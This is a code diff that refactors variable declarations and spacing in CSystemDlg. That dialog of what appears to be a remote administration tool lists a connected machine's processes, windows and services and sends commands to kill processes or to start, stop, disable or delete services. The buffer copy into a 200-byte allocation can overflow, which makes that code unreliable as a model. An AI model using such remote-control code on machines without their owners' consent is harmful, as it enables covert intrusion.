@@ -84,8 +84,6 @@ END_MESSAGE_MAP()
 void CSystemDlg::ShowProcessList()
 {
 	BYTE *lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
-	TCHAR *strExeFile;
-	TCHAR *strProcessName;
 	DWORD dwOffset = 0;
 	CString str;
 	m_list_process.DeleteAllItems();
@@ -94,8 +92,8 @@ void CSystemDlg::ShowProcessList()
 	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
 	{
 		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
-		strExeFile = (TCHAR*)(lpBuffer + dwOffset + sizeof(DWORD));
-		strProcessName = (TCHAR*)(lpBuffer + dwOffset + sizeof(DWORD) + (lstrlen(strExeFile) + 1)*sizeof(TCHAR));
+		TCHAR *strExeFile = (TCHAR*)(lpBuffer + dwOffset + sizeof(DWORD));
+		TCHAR *strProcessName = (TCHAR*)(lpBuffer + dwOffset + sizeof(DWORD) + (lstrlen(strExeFile) + 1) * sizeof(TCHAR));
 
 		m_list_process.InsertItem(i, strExeFile);
 		str.Format(_T("%5u"), *lpPID);
@@ -104,7 +102,7 @@ void CSystemDlg::ShowProcessList()
 		// ItemData 为进程ID
 		m_list_process.SetItemData(i, *lpPID);
 
-		dwOffset += sizeof(DWORD) + (lstrlen(strExeFile) + lstrlen(strProcessName) + 2)*sizeof(TCHAR);
+		dwOffset += sizeof(DWORD) + (lstrlen(strExeFile) + lstrlen(strProcessName) + 2) * sizeof(TCHAR);
 	}
 
 	str.Format(_T("程序路径 / %d"), i);
@@ -119,20 +117,19 @@ void CSystemDlg::ShowWindowsList()
 {
 	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
 	DWORD dwOffset = 0;
-	TCHAR *lpTitle = NULL;
 	m_list_windows.DeleteAllItems();
 	CString	str;
 	int i;
 	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
 	{
 		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
-		lpTitle = (TCHAR *)(lpBuffer + dwOffset + sizeof(DWORD));
+		TCHAR *lpTitle = (TCHAR *)(lpBuffer + dwOffset + sizeof(DWORD));
 		str.Format(_T("%5u"), *lpPID);
 		m_list_windows.InsertItem(i, str);
 		m_list_windows.SetItemText(i, 1, lpTitle);
 		// ItemData 为进程ID
 		m_list_windows.SetItemData(i, *lpPID);
-		dwOffset += sizeof(DWORD) + (lstrlen(lpTitle) + 1)*sizeof(TCHAR);
+		dwOffset += sizeof(DWORD) + (lstrlen(lpTitle) + 1) * sizeof(TCHAR);
 	}
 	str.Format(_T("窗口名称 / %d"), i);
 	LVCOLUMN lvc;
@@ -146,35 +143,28 @@ void CSystemDlg::ShowServicesList()
 {
 	BYTE *lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
 
-	TCHAR* szServiceName;
-	TCHAR* szDisplayName;
-	TCHAR* szServicesDescri;
-	LPDWORD dwRunState;
-	LPDWORD dwStartType;
-
 	DWORD dwOffset = 0;
 	CString str;
-	CString strItem;
 	m_list_Services.DeleteAllItems();
 
 	int i;
 	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
 	{
-		szServiceName = (TCHAR*)(lpBuffer + dwOffset);
-		szServicesDescri = (TCHAR*)(lpBuffer + dwOffset + (lstrlen(szServiceName) + 1) * sizeof(TCHAR));
-		szDisplayName = (TCHAR*)(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + 2)*sizeof(TCHAR));
-		dwRunState = LPDWORD(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + lstrlen(szDisplayName) + 3)*sizeof(TCHAR));
-		dwStartType = LPDWORD(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + lstrlen(szDisplayName) + 3)*sizeof(TCHAR) + sizeof(DWORD));
+		TCHAR * szServiceName = (TCHAR*)(lpBuffer + dwOffset);
+		TCHAR * szServicesDescri = (TCHAR*)(lpBuffer + dwOffset + (lstrlen(szServiceName) + 1) * sizeof(TCHAR));
+		TCHAR * szDisplayName = (TCHAR*)(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + 2) * sizeof(TCHAR));
+		LPDWORD dwRunState = LPDWORD(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + lstrlen(szDisplayName) + 3) * sizeof(TCHAR));
+		LPDWORD dwStartType = LPDWORD(lpBuffer + dwOffset + (lstrlen(szServiceName) + lstrlen(szServicesDescri) + lstrlen(szDisplayName) + 3) * sizeof(TCHAR) + sizeof(DWORD));
 
 		m_list_Services.InsertItem(i, szServiceName);
 		m_list_Services.SetItemText(i, 1, szDisplayName);
 		m_list_Services.SetItemText(i, 2, szServicesDescri);
-		strItem = FormatServiceState(*dwRunState);
+		CString strItem = FormatServiceState(*dwRunState);
 		m_list_Services.SetItemText(i, 3, strItem);
 		strItem = FormatServiceStartType(*dwStartType);
 		m_list_Services.SetItemText(i, 4, strItem);
 
-		dwOffset += sizeof(DWORD) + sizeof(DWORD) + (lstrlen(szServiceName) + lstrlen(szDisplayName) + lstrlen(szServicesDescri) + 3)*sizeof(TCHAR);
+		dwOffset += sizeof(DWORD) + sizeof(DWORD) + (lstrlen(szServiceName) + lstrlen(szDisplayName) + lstrlen(szServicesDescri) + 3) * sizeof(TCHAR);
 	}
 
 	str.Format(_T("服务名称 / %d"), i);
@@ -321,7 +311,6 @@ BOOL CSystemDlg::OnInitDialog()
 
 BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg)
 {
-	// TODO: Add your specialized code here and/or call the base class
 	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
 	{
 		return true;
@@ -397,6 +386,7 @@ void CSystemDlg::ShowSelectWindow()
 		if (m_list_sysinfo.GetItemCount() == 0)
 			GetSysinfoList();
 		break;
+	default: ;
 	}
 }
 
@@ -437,7 +427,7 @@ void CSystemDlg::OnRclickServicesList()
 
 void CSystemDlg::OnKillprocess()
 {
-	CListCtrl	*pListCtrl = NULL;
+	CListCtrl	*pListCtrl;
 	if (m_list_process.IsWindowVisible())
 		pListCtrl = &m_list_process;
 	else if (m_list_windows.IsWindowVisible())
@@ -520,120 +510,108 @@ void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult)
 
 void CSystemDlg::OnSetAuto()
 {
-	CListCtrl	*pListCtrl = NULL;
-	pListCtrl = &m_list_Services;
+	CListCtrl *pListCtrl = &m_list_Services;
 
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
-	int x;
 	DWORD	dwOffset = 1;
 	TCHAR	lpServiceName[128];
 
 	lpBuffer[0] = COMMAND_SERVICE_AUTOSTART;
 
-	x = pListCtrl->GetSelectionMark();
+	int x = pListCtrl->GetSelectionMark();
 	pListCtrl->GetItemText(x, 0, lpServiceName, 128);
 
-	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1)*sizeof(TCHAR));
+	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
 	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
 
 void CSystemDlg::OnSetDemand()
 {
-	CListCtrl	*pListCtrl = NULL;
-	pListCtrl = &m_list_Services;
+	CListCtrl *pListCtrl = &m_list_Services;
 
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
-	int x;
 	DWORD	dwOffset = 1;
 	TCHAR	lpServiceName[128];
 
 	lpBuffer[0] = COMMAND_SERVICE_DEMANDSTART;
 
-	x = pListCtrl->GetSelectionMark();
+	int x = pListCtrl->GetSelectionMark();
 	pListCtrl->GetItemText(x, 0, lpServiceName, 128);
 
-	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1)*sizeof(TCHAR));
+	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
 	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
 
 void CSystemDlg::OnSetDisable()
 {
-	CListCtrl	*pListCtrl = NULL;
-	pListCtrl = &m_list_Services;
+	CListCtrl	*pListCtrl = &m_list_Services;
 
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
-	int x;
 	DWORD	dwOffset = 1;
 	TCHAR	lpServiceName[128];
 
 	lpBuffer[0] = COMMAND_SERVICE_DISABLE;
 
-	x = pListCtrl->GetSelectionMark();
+	int x = pListCtrl->GetSelectionMark();
 	pListCtrl->GetItemText(x, 0, lpServiceName, 128);
 
-	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1)*sizeof(TCHAR));
+	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
 	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
 
 void CSystemDlg::OnSetDelete()
 {
-	CListCtrl	*pListCtrl = NULL;
-	pListCtrl = &m_list_Services;
+	CListCtrl	*pListCtrl = &m_list_Services;
 
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
-	int x;
 	DWORD	dwOffset = 1;
 	TCHAR	lpServiceName[128];
 
 	lpBuffer[0] = COMMAND_SERVICE_DELETE;
 
-	x = pListCtrl->GetSelectionMark();
+	int x = pListCtrl->GetSelectionMark();
 	pListCtrl->GetItemText(x, 0, lpServiceName, 128);
 
-	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1)*sizeof(TCHAR));
+	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
 	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
 
 void CSystemDlg::OnSetStart()
 {
-	CListCtrl	*pListCtrl = NULL;
-	pListCtrl = &m_list_Services;
+	CListCtrl	*pListCtrl = &m_list_Services;
 
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
-	int x;
 	DWORD	dwOffset = 1;
 	TCHAR	lpServiceName[128];
 
 	lpBuffer[0] = COMMAND_SERVICE_START;
 
-	x = pListCtrl->GetSelectionMark();
+	int x = pListCtrl->GetSelectionMark();
 	pListCtrl->GetItemText(x, 0, lpServiceName, 128);
 
-	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1)*sizeof(TCHAR));
+	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
 	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
 
 void CSystemDlg::OnSetStop()
 {
-	CListCtrl	*pListCtrl = NULL;
-	pListCtrl = &m_list_Services;
+	CListCtrl	*pListCtrl = &m_list_Services;
 
 	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 200);
-	int x;
 	DWORD	dwOffset = 1;
 	TCHAR	lpServiceName[128];
 
 	lpBuffer[0] = COMMAND_SERVICE_STOP;
 
-	x = pListCtrl->GetSelectionMark();
+	int x = pListCtrl->GetSelectionMark();
 	pListCtrl->GetItemText(x, 0, lpServiceName, 128);
 
-	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1)*sizeof(TCHAR));
+	memcpy(lpBuffer + dwOffset, (TCHAR*)lpServiceName, (lstrlen(lpServiceName) + 1) * sizeof(TCHAR));
 	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
